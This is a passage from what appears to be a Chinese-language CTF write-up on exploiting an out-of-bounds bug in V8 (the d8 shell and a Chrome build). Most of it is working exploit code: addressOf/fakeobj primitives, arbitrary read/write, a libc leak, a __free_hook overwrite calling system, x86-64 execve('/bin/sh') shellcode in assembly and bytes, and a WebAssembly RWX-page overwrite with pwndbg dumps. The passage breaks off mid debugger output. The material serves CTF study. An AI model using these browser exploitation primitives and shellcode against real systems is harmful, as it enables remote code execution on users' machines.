class="keyword">function</span> <span class="title">objOf</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr + <span class="number">1</span>n);</span><br><span class="line">    floatArray.oob(objMap);</span><br><span class="line">    <span class="keyword">let</span> obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatMap,</span><br><span class="line">    i2f(<span class="number">0</span>n),</span><br><span class="line">    i2f(<span class="number">0x41414141</span>n),</span><br><span class="line">    i2f(<span class="number">0x1000000000</span>n)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">fake_array_addr = addressOf(fake_array);</span><br><span class="line">fake_obj_addr = fake_array_addr + <span class="number">0x20</span>n + <span class="number">0x10</span>n;</span><br><span class="line">fake_obj = objOf(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] write 0x"</span> + hex(data) + <span class="string">" to 0x"</span> + hex(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    <span class="keyword">let</span> data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] read from 0x"</span> + hex(addr) + <span class="string">" get 0x"</span> + hex(data));</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> get_elf_addr = [<span class="number">1</span>n, <span class="number">2</span>n];</span><br><span class="line"><span class="keyword">var</span> code_addr = read(addressOf(get_elf_addr.constructor) + <span class="number">0x30</span>n);</span><br><span class="line"><span class="keyword">var</span> elf_addr = read(code_addr + <span class="number">0x41</span>n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在对象的map中的constructor结构的code属性指向内存的固定偏移处有elf的text段的地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] elf addr 0x"</span> + hex(elf_addr));</span><br><span class="line"><span class="keyword">var</span> elf_base = elf_addr - <span class="number">0xaeae60</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] elf base 0x"</span> + hex(elf_base));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> free_got = elf_base + <span class="number">0xDB1708</span>n;</span><br><span class="line"><span class="keyword">var</span> free_addr = read(free_got);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free address 0x"</span> + hex(free_addr));</span><br><span class="line"><span class="keyword">var</span> libc_base = free_addr - <span class="number">0x844f0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc base 0x"</span> + hex(libc_base));</span><br><span class="line"><span class="keyword">var</span> sys_addr = libc_base + <span class="number">0x45390</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] system address 0x"</span> + hex(sys_addr));</span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x3c67a8</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free hook 0x"</span> + hex(free_hook));</span><br><span class="line">            </span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">write(addressOf(buffer) + <span class="number">0x20</span>n, free_hook);</span><br><span class="line">view.setFloat64(<span class="number">0</span>, i2f(sys_addr), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x676e6f6d652d6361</span>n)); </span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">8</span>, i2f(<span class="number">0x6c63756c61746f72</span>n)); </span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">16</span>, i2f(<span class="number">0x0000000000000000</span>n));</span><br><span class="line">    <span class="comment">// system(gnome-calculator) </span></span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line">get_shell();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于get_shell函数内部的数据是局部变量，所以在执行完函数的时候会释放，就会触发__free_hook</span></span><br></pre></td></tr></table></figure>

<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>该exp我只在d8中实现了，在题目所给的chrome中，可能由于编译选项的不同，导致偏移不同，但我目前也没有办法得到在chrome中v8的代码段地址</p>
<p>所以这种方法具有很大的局限性，只能自娱自乐</p>
<h2 id="覆写wasm代码段"><a href="#覆写wasm代码段" class="headerlink" title="覆写wasm代码段"></a>覆写wasm代码段</h2><p>该方法是利用了wasm代码段可读可写可执行的特性。但是在生成wasm代码的时候，不能够调用libc的函数，所以只能先导入wasm代码之后再找到它的地址，再把它修改成我们的shellcode来执行</p>
<p>wasm代码在线生成网址：<a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">https://wasdk.github.io/WasmFiddle/</a></p>
<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>由于无法确定libc基址，所以采用系统调用的方式来执行shellcode</p>
<p>shell.asm</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 0x3b</span><br><span class="line">    mov rdi, 0x68732f6e69622fff</span><br><span class="line">    shr rdi, 8</span><br><span class="line">    push rdi</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf64 ./shell.asm</span><br></pre></td></tr></table></figure>

<p>就得到了shell.o文件</p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ld -o shell shell.o</span><br></pre></td></tr></table></figure>

<p>就得到了名为shell的可执行文件，执行它，测试我们编写的shellcode是否正确</p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> objcopy -O binary ./shell.o code</span><br></pre></td></tr></table></figure>

<p>就得到了一个名为code的文件，该文件中只有汇编代码，没有其他无用的信息</p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> xxd -i ./code</span><br></pre></td></tr></table></figure>

<p>就会得到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> __code[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xef</span>, <span class="number">0x08</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __code_len = <span class="number">31</span>;</span><br></pre></td></tr></table></figure>

<p>如果是内联在c代码中，还可以用以下的形式来测试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> __code[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xef</span>, <span class="number">0x08</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __code_len = <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*CODE)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((CODE)__code)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我测试的时候失败了，原因是__code位于bss段，该段不可执行</p>
<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p>先写一段无关的wasm代码，将其导入</p>
<p>然后在内存中就会存在一块可读可写可执行的区域，将shellcode放到这片区域然后执行wasm的函数指针就会触发shellcode</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf)</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatMap = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> objMap = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj;</span><br><span class="line">    objArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>]) - <span class="number">1</span>n;</span><br><span class="line">    objArray.oob(objMap);</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objOf</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr + <span class="number">1</span>n);</span><br><span class="line">    floatArray.oob(objMap);</span><br><span class="line">    <span class="keyword">let</span> obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatMap,</span><br><span class="line">    i2f(<span class="number">0</span>n),</span><br><span class="line">    i2f(<span class="number">0x41414141</span>n),</span><br><span class="line">    i2f(<span class="number">0x1000000000</span>n)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">fake_array_addr = addressOf(fake_array);</span><br><span class="line">fake_obj_addr = fake_array_addr + <span class="number">0x20</span>n + <span class="number">0x10</span>n;</span><br><span class="line">fake_obj = objOf(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] write 0x"</span> + hex(data) + <span class="string">" to 0x"</span> + hex(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    <span class="keyword">let</span> data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] read from 0x"</span> + hex(addr) + <span class="string">" get 0x"</span> + hex(data));</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7f</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x6d</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x6d</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0a</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x0b</span></span><br><span class="line">]);  <span class="comment">//做任何题这个数组都可以照搬过去</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read(addressOf(func) + <span class="number">0x18</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x2e0fdf0a24d9</span></span><br><span class="line"><span class="comment">0x2e0fdf0a24d9: [Function] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x182d33284379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x2e0fdf082109 &lt;JSFunction (sfi = 0x800a2fc3b29)&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x0cb773240c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - function prototype: &lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="comment"> - shared_info: 0x2e0fdf0a24a1 &lt;SharedFunctionInfo 0&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x0cb773244ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - context: 0x2e0fdf081869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - code: 0x361a8e502001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - WASM instance 0x2e0fdf0a22e1</span></span><br><span class="line"><span class="comment"> - WASM function index 0</span></span><br><span class="line"><span class="comment"> - properties: 0x0cb773240c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x0800a2fc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #name: 0x0800a2fc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #arguments: 0x0800a2fc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #caller: 0x0800a2fc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> wasm_exported_function_data_addr = read(shared_info_addr + <span class="number">8</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x2e0fdf0a24a1</span></span><br><span class="line"><span class="comment">0x2e0fdf0a24a1: [SharedFunctionInfo] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x0cb7732409e1 &lt;Map[56]&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x0cb773244ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - function_map_index: 144</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - expected_nof_properties: 0</span></span><br><span class="line"><span class="comment"> - language_mode: sloppy</span></span><br><span class="line"><span class="comment"> - data: 0x2e0fdf0a2479 &lt;WasmExportedFunctionData&gt;</span></span><br><span class="line"><span class="comment"> - code (from data): 0x361a8e502001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - function token position: -1</span></span><br><span class="line"><span class="comment"> - start position: -1</span></span><br><span class="line"><span class="comment"> - end position: -1</span></span><br><span class="line"><span class="comment"> - no debug info</span></span><br><span class="line"><span class="comment"> - scope info: 0x0cb773240c61 &lt;ScopeInfo[0]&gt;</span></span><br><span class="line"><span class="comment"> - length: 0</span></span><br><span class="line"><span class="comment"> - feedback_metadata: 0xcb773242a39: [FeedbackMetadata]</span></span><br><span class="line"><span class="comment"> - map: 0x0cb773241319 &lt;Map&gt;</span></span><br><span class="line"><span class="comment"> - slot_count: 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read(wasm_exported_function_data_addr + <span class="number">0x10</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x2e0fdf0a2479</span></span><br><span class="line"><span class="comment">0x2e0fdf0a2479: [WasmExportedFunctionData] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x0cb773245879 &lt;Map[40]&gt;</span></span><br><span class="line"><span class="comment"> - wrapper_code: 0x361a8e502001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - instance: 0x2e0fdf0a22e1 &lt;Instance map = 0x182d33289789&gt;</span></span><br><span class="line"><span class="comment"> - function_index: 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> code_addr = read(wasm_instance_addr + <span class="number">0x88</span>n);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x2e0fdf0a22e0 20</span></span><br><span class="line"><span class="comment">00:0000│   0x2e0fdf0a22e0 —▸ 0x182d33289789 ◂— 0x2500000cb7732401</span></span><br><span class="line"><span class="comment">01:0008│   0x2e0fdf0a22e8 —▸ 0xcb773240c71 ◂— 0xcb7732408</span></span><br><span class="line"><span class="comment">... ↓</span></span><br><span class="line"><span class="comment">03:0018│   0x2e0fdf0a22f8 —▸ 0x7f1309fb0000 ◂— 0x0</span></span><br><span class="line"><span class="comment">04:0020│   0x2e0fdf0a2300 ◂— 0x10000</span></span><br><span class="line"><span class="comment">05:0028│   0x2e0fdf0a2308 ◂— 0xffff</span></span><br><span class="line"><span class="comment">06:0030│   0x2e0fdf0a2310 —▸ 0x56121b0e6998 —▸ 0x7ffc3b495e40 ◂— 0x7ffc3b495e40</span></span><br><span class="line"><span class="comment">07:0038│   0x2e0fdf0a2318 —▸ 0xcb773240c71 ◂— 0xcb7732408</span></span><br><span class="line"><span class="comment">08:0040│   0x2e0fdf0a2320 